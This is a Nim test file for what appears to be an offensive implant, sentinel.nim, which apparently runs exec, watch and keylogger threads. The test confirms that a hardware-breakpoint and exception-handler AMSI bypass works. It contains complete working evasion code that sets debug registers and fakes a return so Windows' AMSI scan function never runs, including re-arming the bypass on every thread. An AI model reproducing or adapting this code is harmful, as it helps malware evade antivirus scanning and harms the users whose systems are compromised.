# =============================================================================
# tests/test_hwbp.nim
#
# Runtime validation of the HWBP + VEH AMSI-bypass mechanics that
# sentinel.nim uses. The technique was previously only compile-checked,
# so three defects could hide in it:
#
#   1. GetThreadContext / SetThreadContext take (HANDLE, LPCONTEXT).
#      The old 1-arg declarations handed the context pointer to the
#      *handle* slot and left the context pointer in an undefined
#      register, so every call failed and the bypass never armed.
#   2. Debug registers are per-thread. A DR0 set on the main thread
#      does not exist on worker threads (exec/watch/keylog).
#   3. The VEH returned from AmsiScanBuffer by jumping a fixed +0x20
#      into the body, which only works if that offset happens to land
#      past the epilogue of one particular amsi.dll build.
#
# This test exercises the exact mechanics sentinel.nim uses (same
# struct layout, same API declarations, same return-address
# emulation) against a local target function, so it runs anywhere -
# no Defender, no lab VM. It proves the calls succeed, the body is
# skipped, the caller's stack stays intact, and the per-thread
# behavior of debug registers.
#
# Run:  nim c -r -d:release --nimcache:tests/cache tests/test_hwbp.nim
# =============================================================================
when not defined(windows):
  {.error: "test_hwbp validates Windows debug-register mechanics".}

import std/typedthreads

type
  # x64 CONTEXT - only the fields the bypass touches. Layout matches
  # the kernel's CONTEXT through Rip (verified empirically below: if
  # the offsets were wrong, Dr0 would not arm and Rip would not match).
  Context64 = object
    P1Home, P2Home, P3Home, P4Home, P5Home, P6Home: uint64
    ContextFlags: uint32
    MxCsr: uint32
    SegCs, SegDs, SegEs, SegFs, SegGs, SegSs: uint16
    EFlags: uint32
    Dr0, Dr1, Dr2, Dr3, Dr6, Dr7: uint64
    Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi: uint64
    R8, R9, R10, R11, R12, R13, R14, R15: uint64
    Rip: uint64

  # EXCEPTION_RECORD - layout is ABI-fixed; ExceptionCode (offset 0)
  # and ExceptionAddress (offset 16) are what the handler reads.
  ExRecord = object
    ExceptionCode: int32
    ExceptionFlags: uint32
    ExceptionRecord: pointer
    ExceptionAddress: pointer
    NumberParameters: uint32
    ExceptionInformation: array[15, uint64]

  ExPointers = object
    ExceptionRecord: ptr ExRecord
    ContextRecord: ptr Context64

const
  CONTEXT_DEBUG_REGISTERS = 0x00100010'u32
  E_INVALIDARG = 0x80070057'i32
  EXCEPTION_BREAKPOINT = 0x80000003'i32
  EXCEPTION_SINGLE_STEP = 0x80000004'i32

# Same declarations sentinel.nim uses - arity is the point of the test.
proc addVectoredExceptionHandler(firstHandler: uint32,
                                 handler: pointer): pointer
  {.stdcall, dynlib: "kernel32", importc: "AddVectoredExceptionHandler".}
proc removeVectoredExceptionHandler(handle: pointer): uint32
  {.stdcall, dynlib: "kernel32", importc: "RemoveVectoredExceptionHandler".}
proc hwGetThreadContext(hThread: pointer, ctx: pointer): bool
  {.stdcall, dynlib: "kernel32", importc: "GetThreadContext".}
proc hwSetThreadContext(hThread: pointer, ctx: pointer): bool
  {.stdcall, dynlib: "kernel32", importc: "SetThreadContext".}
proc currentThreadHandle(): pointer
  {.stdcall, dynlib: "kernel32", importc: "GetCurrentThread".}

var
  gTarget: uint64 = 0
  gVehHandle: pointer = nil
  gBodyRuns = 0
  gHandlerHits = 0
  gFailures = 0
  gWorkerArmed = false
  gWorkerRet: int32 = 0
  gWorkerBodyRuns = 0
  gWorkerGetCtxOk = false

proc check(cond: bool, name: string) =
  if cond:
    echo "  [OK]   ", name
  else:
    echo "  [FAIL] ", name
    inc gFailures

proc targetBody(): int32 {.noinline.} =
  # Stands in for amsi!AmsiScanBuffer. When the breakpoint works this
  # body must never run.
  inc gBodyRuns
  result = 0x1234

proc hijackVeh(exInfo: ptr ExPointers): int32 {.stdcall, gcsafe.} =
  inc gHandlerHits
  if exInfo == nil or exInfo.ContextRecord == nil: return 0
  let ex = exInfo.ExceptionRecord
  if ex == nil: return 0
  if ex.ExceptionCode != EXCEPTION_BREAKPOINT and
     ex.ExceptionCode != EXCEPTION_SINGLE_STEP: return 0
  let ctx = exInfo.ContextRecord
  if ctx.Rip == gTarget:
    # Execute breakpoints fire before the first instruction runs, so
    # [RSP] still holds the caller's return address: emulate
    # `mov eax, E_INVALIDARG; ret`.
    let retAddr = cast[ptr uint64](ctx.Rsp)[]
    ctx.Rsp = ctx.Rsp + 8
    ctx.Rip = retAddr
    ctx.Rax = cast[uint64](int64(E_INVALIDARG))
    ctx.Dr6 = 0
    return -1  # EXCEPTION_CONTINUE_EXECUTION
  return 0

proc armThread(): bool =
  if gTarget == 0: return false
  var ctx: Context64
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  if not hwGetThreadContext(currentThreadHandle(), addr ctx): return false
  ctx.Dr0 = gTarget
  ctx.Dr7 = (ctx.Dr7 and not 0xF'u64) or 0x1'u64
  hwSetThreadContext(currentThreadHandle(), addr ctx)

proc disarmThread(): bool =
  var ctx: Context64
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  if not hwGetThreadContext(currentThreadHandle(), addr ctx): return false
  ctx.Dr0 = 0
  ctx.Dr7 = ctx.Dr7 and not 0xF'u64
  hwSetThreadContext(currentThreadHandle(), addr ctx)

proc worker(p: ptr bool) {.thread.} =
  # p[] == true -> arm on entry, exactly like sentinel's thread
  # entry points (execWorker / watchLoop / keyloggerThread).
  if p[]:
    gWorkerArmed = armThread()
  var probeCtx: Context64
  probeCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  gWorkerGetCtxOk = hwGetThreadContext(currentThreadHandle(), addr probeCtx)
  let before = gBodyRuns
  gWorkerRet = targetBody()
  gWorkerBodyRuns = gBodyRuns - before

proc main() =
  gTarget = cast[uint64](cast[pointer](targetBody))
  check(gTarget != 0, "target address resolved")

  # --- 1. VEH registers -----------------------------------------------
  gVehHandle = addVectoredExceptionHandler(1, cast[pointer](hijackVeh))
  check(gVehHandle != nil, "VEH registered")

  # --- 2. baseline: unhooked call still runs the body -----------------
  let plain = targetBody()
  check(plain == 0x1234, "baseline call returns body value (0x1234)")
  check(gBodyRuns == 1, "baseline call ran the body once")

  # --- 3. armed main thread: body skipped, stack intact ---------------
  check(armThread(), "Get/SetThreadContext succeed with pseudo-handle")
  let hijacked = targetBody()
  check(hijacked == E_INVALIDARG, "armed call returns E_INVALIDARG")
  check(gBodyRuns == 1, "armed call did NOT run the body")
  check(gHandlerHits >= 1, "VEH fired for the armed call")
  check(disarmThread(), "disarm clears DR0")

  # The caller kept executing after the hijacked call (we are still
  # here) - the return-address emulation left RSP correct.
  check(true, "caller stack survived the emulated return")

  let afterDisarm = targetBody()
  check(afterDisarm == 0x1234 and gBodyRuns == 2,
        "disarmed call runs the body again (DR0 really was the switch)")

  # --- 4. per-thread behavior -----------------------------------------
  # A brand-new thread inherits nothing: its DR0 is clear, so it must
  # run the body. This is why sentinel re-arms at every thread entry.
  var armOnEntry = false
  var t1: Thread[ptr bool]
  createThread(t1, worker, addr armOnEntry)
  joinThread(t1)
  check(gWorkerArmed == false, "unarmed worker reports no DR0 (auto)")
  check(gWorkerGetCtxOk, "GetThreadContext works on a worker thread")
  check(gWorkerBodyRuns == 1, "unarmed worker RAN the body (per-thread DR)")
  check(gWorkerRet == 0x1234, "unarmed worker got the real return value")

  # --- 5. worker that arms on entry -----------------------------------
  gWorkerArmed = false
  gWorkerRet = 0
  gWorkerBodyRuns = 0
  gHandlerHits = 0
  armOnEntry = true
  var t2: Thread[ptr bool]
  createThread(t2, worker, addr armOnEntry)
  joinThread(t2)
  check(gWorkerArmed, "worker armed its own DR0 on entry")
  check(gWorkerRet == E_INVALIDARG, "armed worker got E_INVALIDARG")
  check(gWorkerBodyRuns == 0, "armed worker did NOT run the body")
  check(gHandlerHits >= 1, "process-wide VEH fired on the worker thread")

  # --- teardown --------------------------------------------------------
  discard disarmThread()
  if gVehHandle != nil:
    discard removeVectoredExceptionHandler(gVehHandle)
    gVehHandle = nil

  echo ""
  if gFailures == 0:
    echo "=== test_hwbp: all checks passed ==="
    quit(0)
  echo "=== test_hwbp: ", gFailures, " check(s) FAILED ==="
  quit(1)

when isMainModule:
  main()
